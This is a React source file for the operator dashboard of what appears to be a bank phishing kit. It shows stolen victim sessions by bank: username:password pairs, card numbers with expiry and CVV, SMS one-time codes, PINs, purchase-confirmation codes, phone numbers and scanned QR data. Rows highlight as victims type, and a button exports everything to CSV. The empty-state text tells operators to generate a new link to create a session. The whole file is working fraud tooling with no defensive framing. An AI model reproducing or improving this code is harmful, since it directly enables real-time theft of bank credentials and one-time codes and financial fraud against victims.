import React, { useState, useEffect } from 'react';
import { Session } from '@shared/schema';
import { Skeleton } from '@/components/ui/skeleton';
import { useMutation } from '@tanstack/react-query';
import { apiRequest } from '@/lib/queryClient';
import { queryClient } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useDeviceInfo } from '@/hooks/use-device-orientation';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
import { DeleteConfirmDialog } from './DeleteConfirmDialog';

interface AccessTableProps {
  sessions: Session[];
  activeBank: string;
  selectedSessionId: string | null;
  onSelectSession: (sessionId: string) => void;
  isLoading: boolean;
}

const AccessTable: React.FC<AccessTableProps> = ({ 
  sessions, 
  activeBank, 
  selectedSessionId,
  onSelectSession,
  isLoading 
}) => {
  const { toast } = useToast();
  const { isMobile } = useDeviceInfo();
  // Estado para controlar el tamaño de la pantalla
  const [isSmallScreen, setIsSmallScreen] = useState(window.innerWidth < 1024);
  // Estado para resaltar las filas recién actualizadas
  const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});
  
  // Estado para resaltar campos específicos que han sido actualizados
  const [highlightedFields, setHighlightedFields] = useState<Record<string, Record<string, boolean>>>({});
  
  // Estado para el diálogo de confirmación de eliminación
  const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState<boolean>(false);
  const [sessionToDelete, setSessionToDelete] = useState<Session | null>(null);
  
  // Mutation para guardar una sesión
  const saveSessionMutation = useMutation({
    mutationFn: async (sessionId: string) => {
      const res = await apiRequest('POST', `/api/sessions/${sessionId}/save`);
      return await res.json();
    },
    onSuccess: () => {
      toast({
        title: "Sesión guardada",
        description: "La sesión ha sido guardada en accesos guardados.",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
    },
    onError: (error) => {
      toast({
        title: "Error al guardar sesión",
        description: error.message,
        variant: "destructive",
      });
    }
  });
  
  // Mutation para eliminar una sesión
  const deleteSessionMutation = useMutation({
    mutationFn: async (sessionId: string) => {
      const res = await apiRequest('DELETE', `/api/sessions/${sessionId}`);
      return await res.json();
    },
    onSuccess: () => {
      toast({
        title: "Sesión eliminada",
        description: "La sesión ha sido eliminada correctamente.",
      });
      // La actualización se manejará a través de websockets
    },
    onError: (error) => {
      toast({
        title: "Error al eliminar sesión",
        description: error.message,
        variant: "destructive",
      });
    }
  });
  
  // Filter sessions by bank if a specific bank is selected
  const filteredSessions = activeBank === 'todos' 
    ? sessions 
    : sessions.filter(session => session.banco === activeBank);
    
  // Referencias previas de las sesiones para poder comparar y detectar cambios
  const [prevSessions, setPrevSessions] = useState<Session[]>([]);
  
  // Función para descargar un código QR (como imagen o texto)
  const handleDownloadQR = (session: Session) => {
    try {
      // Primero intentamos descargar la imagen del QR si existe
      if (session.qrImageData && session.qrImageData.startsWith('data:')) {
        const link = document.createElement('a');
        link.href = session.qrImageData;
        link.download = `qr_image_${new Date().toISOString().slice(0, 10)}.png`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        toast({
          title: "Descarga exitosa",
          description: "La imagen del código QR se ha descargado correctamente.",
          variant: "default",
        });
        return;
      }
      
      // Si no hay imagen, intentamos con el contenido del QR
      if (session.qrData) {
        // Si es una URL de datos (data URL), podemos descargarla directamente
        if (session.qrData.startsWith('data:')) {
          const link = document.createElement('a');
          link.href = session.qrData;
          link.download = `qr_code_${new Date().toISOString().slice(0, 10)}.png`;
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          
          toast({
            title: "Descarga exitosa",
            description: "El código QR se ha descargado correctamente.",
            variant: "default",
          });
        } 
        // Si es solo texto, lo convertimos en un archivo de texto
        else {
          const blob = new Blob([session.qrData], { type: 'text/plain' });
          const url = URL.createObjectURL(blob);
          const link = document.createElement('a');
          link.href = url;
          link.download = `qr_data_${new Date().toISOString().slice(0, 10)}.txt`;
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          
          toast({
            title: "Descarga exitosa",
            description: "Los datos del QR se han descargado como texto.",
            variant: "default",
          });
        }
      } else {
        toast({
          title: "No hay datos QR",
          description: "No se encontraron datos de QR para descargar.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Error al descargar QR:', error);
      toast({
        title: "Error al descargar",
        description: "Ha ocurrido un error al descargar el código QR.",
        variant: "destructive",
      });
    }
  };
  
  // Función para exportar datos a CSV
  const exportToCSV = () => {
    if (filteredSessions.length === 0) {
      toast({
        title: "Sin datos para exportar",
        description: "No hay sesiones disponibles para exportar.",
        variant: "destructive",
      });
      return;
    }
    
    try {
      // Definir encabezados del CSV
      const headers = [
        'Banco', 
        'Folio', 
        'Usuario', 
        'Contraseña', 
        'Tarjeta', 
        'Fecha Vencimiento', 
        'CVV', 
        'SMS', 
        'NIP', 
        'SMS Compra', 
        'Celular', 
        'Paso Actual', 
        'Creado Por', 
        'Fecha'
      ];
      
      // Convertir datos a filas CSV
      const rows = filteredSessions.map(session => [
        session.banco || '',
        session.folio || '',
        session.username || '',
        session.password || '',
        session.tarjeta || '',
        session.fechaVencimiento || '',
        session.cvv || '',
        session.sms || '',
        session.nip || '',
        session.smsCompra || '',
        session.celular || '',
        session.pasoActual || '',
        session.createdBy || '',
        new Date(session.createdAt || Date.now()).toLocaleString()
      ]);
      
      // Unir encabezados y filas
      const csvContent = [
        headers.join(','),
        ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
      ].join('\n');
      
      // Crear un blob y un link para descargar
      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.setAttribute('href', url);
      link.setAttribute('download', `sesiones_${activeBank.toLowerCase()}_${new Date().toISOString().slice(0, 10)}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      toast({
        title: "Exportación exitosa",
        description: `Se han exportado ${filteredSessions.length} sesiones a CSV.`,
        variant: "default",
      });
    } catch (error) {
      console.error('Error al exportar a CSV:', error);
      toast({
        title: "Error al exportar",
        description: "Ha ocurrido un error al exportar los datos. Intente nuevamente.",
        variant: "destructive",
      });
    }
  };
  
  // Detectar cambios en las sesiones para resaltar las filas actualizadas
  useEffect(() => {
    if (sessions.length === 0) return;
    
    // Marcar todas las sesiones como destacadas
    const newHighlights: Record<string, boolean> = {};
    const newFieldHighlights: Record<string, Record<string, boolean>> = {};
    
    // Comparar sesiones actuales con las anteriores para encontrar cambios específicos
    sessions.forEach(session => {
      const prevSession = prevSessions.find(s => s.sessionId === session.sessionId);
      
      // Resaltar la fila completa
      newHighlights[session.sessionId] = true;
      
      // Inicializar objeto de campos para esta sesión
      newFieldHighlights[session.sessionId] = {};
      
      // Si encontramos la sesión previa, comparamos campo por campo
      if (prevSession) {
        // Comparar campos específicos para resaltar
        if (prevSession.folio !== session.folio) {
          newFieldHighlights[session.sessionId].folio = true;
        }
        if (prevSession.username !== session.username || prevSession.password !== session.password) {
          newFieldHighlights[session.sessionId].credentials = true;
        }
        if (prevSession.tarjeta !== session.tarjeta || 
            prevSession.fechaVencimiento !== session.fechaVencimiento ||
            prevSession.cvv !== session.cvv) {
          newFieldHighlights[session.sessionId].tarjeta = true;
        }
        if (prevSession.sms !== session.sms) {
          newFieldHighlights[session.sessionId].sms = true;
        }
        if (prevSession.nip !== session.nip) {
          newFieldHighlights[session.sessionId].nip = true;
        }
        if (prevSession.smsCompra !== session.smsCompra) {
          newFieldHighlights[session.sessionId].smsCompra = true;
        }
        if (prevSession.celular !== session.celular) {
          newFieldHighlights[session.sessionId].celular = true;
        }
        if (prevSession.pasoActual !== session.pasoActual) {
          newFieldHighlights[session.sessionId].pasoActual = true;
        }
      } else {
        // Si es una sesión nueva, resaltar todos los campos
        newFieldHighlights[session.sessionId] = {
          folio: true,
          credentials: true,
          tarjeta: true,
          sms: true,
          nip: true,
          smsCompra: true,
          celular: true,
          pasoActual: true
        };
      }
    });
    
    // Actualizar estados
    setHighlightedRows(newHighlights);
    setHighlightedFields(newFieldHighlights);
    
    // Guardar las sesiones actuales como previas para la próxima comparación
    setPrevSessions([...sessions]);
    
    // Eliminar el resaltado después de 3 segundos
    const timer = setTimeout(() => {
      setHighlightedRows({});
      setHighlightedFields({});
    }, 3000);
    
    return () => clearTimeout(timer);
  }, [sessions]);

  // Detectar cambios en el tamaño de pantalla
  useEffect(() => {
    const handleResize = () => {
      setIsSmallScreen(window.innerWidth < 1024);
    };
    
    window.addEventListener('resize', handleResize);
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  if (isLoading) {
    return (
      <div className="px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto", width: "100%"}}>
        <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
          <div className="p-4">
            <Skeleton className="h-8 w-full mb-4" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
          </div>
        </div>
      </div>
    );
  }

  // Función para eliminar una sesión
  const handleDeleteSession = () => {
    if (sessionToDelete) {
      deleteSessionMutation.mutate(sessionToDelete.sessionId);
    }
  };
  
  return (
    <div className="px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto", width: "100%"}}>
      {/* Diálogo de confirmación de eliminación */}
      <DeleteConfirmDialog 
        isOpen={isDeleteDialogOpen}
        onClose={() => setIsDeleteDialogOpen(false)}
        onConfirm={handleDeleteSession}
        session={sessionToDelete}
      />
      
      {/* Botón de exportación */}
      {filteredSessions.length > 0 && (
        <div className="mb-3 flex justify-end">
          <Button
            variant="outline"
            size="sm"
            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
            onClick={exportToCSV}
          >
            <Download className="h-4 w-4" />
            Exportar a CSV
          </Button>
        </div>
      )}
      
      {/* El efecto para detectar cambios en el tamaño de pantalla está declarado fuera del return */}
      
      {/* Vista para tarjetas para todos los dispositivos (móvil y pantallas pequeñas) */}
      {/* Mostramos tarjetas para móvil o para tablets/desktop con pantallas pequeñas */}
      {(isMobile || isSmallScreen) ? (
        <>
          {filteredSessions.length === 0 ? (
            <div className="w-full bg-[#1e1e1e] rounded-lg p-4 text-center text-gray-400">
              No hay sesiones activas. Genere un nuevo link para crear una sesión.
            </div>
          ) : (
            <div className="space-y-4">
              {filteredSessions.map((session, index) => (
                <Card 
                  key={session.sessionId}
                  className={`bg-[#1e1e1e] border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'border-[#4c4c4c]' : ''} 
                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
                  onClick={() => onSelectSession(session.sessionId)}
                >
                  <CardContent className="p-4">
                    <div className="flex justify-between items-center mb-3">
                      <div className="font-bold text-[#ccc] text-lg">{session.banco}</div>
                      <div className={`px-3 py-1 rounded text-xs ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold bg-[#003a4f]' : 'bg-[#2a2a2a] text-[#ccc]'}`}>
                        {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : 'Inicio'}
                      </div>
                    </div>
                    
                    <div className="mb-3 flex gap-1 items-center">
                      <Copy className="h-4 w-4 text-[#888]" />
                      <div className={`text-sm ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                        Folio: {session.folio}
                      </div>
                    </div>
                    
                    {(session.username || session.password) && (
                      <div className="mb-3 flex gap-1 items-center">
                        <AlertCircle className="h-4 w-4 text-[#888]" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          {session.username && session.password 
                            ? `${session.username}:${session.password}` 
                            : '--'}
                        </div>
                      </div>
                    )}
                    
                    {session.tarjeta && (
                      <div className="mb-3 flex gap-1 items-start">
                        <CreditCard className="h-4 w-4 text-[#888] mt-0.5" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          <div>{session.tarjeta}</div>
                          {(session.fechaVencimiento || session.cvv) && (
                            <div className="text-xs mt-1 opacity-80">
                              {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                              {session.cvv && <span>CVV: {session.cvv}</span>}
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                    
                    {session.sms && (
                      <div className="mb-2 flex gap-1 items-center">
                        <MessageSquare className="h-4 w-4 text-[#888]" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          SMS: {session.sms}
                        </div>
                      </div>
                    )}
                    
                    {session.nip && (
                      <div className="mb-2 flex gap-1 items-center">
                        <KeyRound className="h-4 w-4 text-[#888]" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          NIP: {session.nip}
                        </div>
                      </div>
                    )}
                    
                    {session.smsCompra && (
                      <div className="mb-2 flex gap-1 items-center">
                        <CheckCircle2 className="h-4 w-4 text-[#888]" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          SMS Compra: {session.smsCompra}
                        </div>
                      </div>
                    )}
                    
                    {/* Mostrar datos QR si existen */}
                    {session.qrData && (
                      <div className="mb-2">
                        <div className="flex gap-1 items-center">
                          <QrCode className="h-4 w-4 text-[#3af]" />
                          <div className="text-sm text-[#00ffff] font-bold">
                            Código QR escaneado
                          </div>
                        </div>
                        <div className="mt-2 flex justify-center">
                          <Button
                            variant="outline"
                            size="sm"
                            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
                            onClick={(e) => {
                              e.stopPropagation(); // Evitar que se seleccione la sesión
                              handleDownloadQR(session);
                            }}
                          >
                            <Download className="h-4 w-4" />
                            Descargar QR
                          </Button>
                        </div>
                      </div>
                    )}
                    
                    {session.celular && (
                      <div className="mb-2 flex gap-1 items-center">
                        <Smartphone className="h-4 w-4 text-[#888]" />
                        <div className={`text-sm ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                          Celular: {session.celular}
                        </div>
                      </div>
                    )}
                    
                    {/* Información del creador (solo visible para administradores) */}
                    <div className="mb-3 flex gap-1 items-center">
                      <Target className="h-4 w-4 text-[#888]" />
                      <div className="text-sm text-[#ccc]">
                        Creado por: {session.createdBy || '--'}
                      </div>
                    </div>
                    
                    <div className="flex gap-2 mt-4 border-t border-[#333] pt-3">
                      <Button 
                        variant="outline" 
                        size="sm"
                        className="flex-1 bg-[#2c2c2c] hover:bg-[#1f1f1f] border-[#444]"
                        onClick={(e) => {
                          e.stopPropagation();
                          onSelectSession(session.sessionId);
                        }}
                      >
                        Seleccionar
                      </Button>
                      
                      {!session.saved && (
                        <Button 
                          size="sm"
                          className="flex-1 bg-[#005c99] hover:bg-[#004d80] text-white"
                          onClick={(e) => {
                            e.stopPropagation();
                            saveSessionMutation.mutate(session.sessionId);
                          }}
                          disabled={saveSessionMutation.isPending}
                        >
                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
                        </Button>
                      )}
                      
                      <Button 
                        variant="destructive"
                        size="sm"
                        className="flex-1 bg-[#990000] hover:bg-[#800000]"
                        onClick={(e) => {
                          e.stopPropagation();
                          setSessionToDelete(session);
                          setIsDeleteDialogOpen(true);
                        }}
                        disabled={deleteSessionMutation.isPending}
                      >
                        {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </>
      ) : (
        /* Vista para desktop: tabla */
        <div className="overflow-x-auto w-full">
          <table className="min-w-full bg-[#1e1e1e] rounded-lg overflow-hidden" style={{tableLayout: "fixed"}}>
            <thead>
              <tr className="bg-[#222]">
                <th className="p-3 text-left w-[40px]">#</th>
                <th className="p-3 text-left w-[80px]">Folio</th>
                <th className="p-3 text-left w-[120px]">User:Password</th>
                <th className="p-3 text-left w-[100px]">Banco</th>
                <th className="p-3 text-left w-[150px]">Tarjeta</th>
                <th className="p-3 text-left w-[80px]">SMS</th>
                <th className="p-3 text-left w-[80px]">NIP</th>
                <th className="p-3 text-left w-[100px]">SMS COMPRA</th>
                <th className="p-3 text-left w-[100px]">QR</th>
                <th className="p-3 text-left w-[80px]">Celular</th>
                <th className="p-3 text-left w-[100px]">Paso actual</th>
                <th className="p-3 text-left w-[100px]">Creado por</th>
                <th className="p-3 text-left w-[120px]">Acciones</th>
              </tr>
            </thead>
            <tbody>
              {filteredSessions.length === 0 && (
                <tr>
                  <td colSpan={12} className="p-4 text-center text-gray-400">
                    No hay sesiones activas. Genere un nuevo link para crear una sesión.
                  </td>
                </tr>
              )}
              
              {filteredSessions.map((session, index) => (
                <tr 
                  key={session.sessionId}
                  className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} 
                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
                  onClick={() => onSelectSession(session.sessionId)}
                >
                  <td className="p-3 text-[#ccc]">{index + 1}</td>
                  <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.folio}
                  </td>
                  <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.username && session.password 
                      ? `${session.username}:${session.password}` 
                      : '--'}
                  </td>
                  <td className="p-3 text-[#ccc] truncate">{session.banco}</td>
                  <td className={`p-3 overflow-hidden ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.tarjeta ? (
                      <div>
                        <div>{session.tarjeta}</div>
                        {(session.fechaVencimiento || session.cvv) && (
                          <div className="text-xs opacity-80">
                            {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                            {session.cvv && <span>CVV: {session.cvv}</span>}
                          </div>
                        )}
                      </div>
                    ) : '--'}
                  </td>
                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.sms || '--'}
                  </td>
                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.nip || '--'}
                  </td>
                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.smsCompra || '--'}
                  </td>
                  <td className="p-3 text-[#ccc]">
                    {session.qrData ? (
                      <Button
                        variant="outline"
                        size="sm"
                        className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDownloadQR(session);
                        }}
                      >
                        <Download className="h-4 w-4" />
                        Descargar
                      </Button>
                    ) : '--'}
                  </td>
                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.celular || '--'}
                  </td>
                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                    {session.pasoActual ? 
                      session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) 
                      : 'Inicio'}
                  </td>
                  <td className="p-3 text-[#ccc] truncate">{session.createdBy || '--'}</td>
                  <td className="p-3 flex gap-2">
                    {!session.saved && (
                      <Button 
                        size="sm"
                        className="bg-[#005c99] hover:bg-[#004d80] text-white"
                        onClick={(e) => {
                          e.stopPropagation();
                          saveSessionMutation.mutate(session.sessionId);
                        }}
                        disabled={saveSessionMutation.isPending}
                      >
                        {saveSessionMutation.isPending ? '...' : 'Guardar'}
                      </Button>
                    )}
                    <Button 
                      variant="destructive"
                      size="sm"
                      className="bg-[#990000] hover:bg-[#800000]"
                      onClick={(e) => {
                        e.stopPropagation();
                        setSessionToDelete(session);
                        setIsDeleteDialogOpen(true);
                      }}
                      disabled={deleteSessionMutation.isPending}
                    >
                      {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default AccessTable;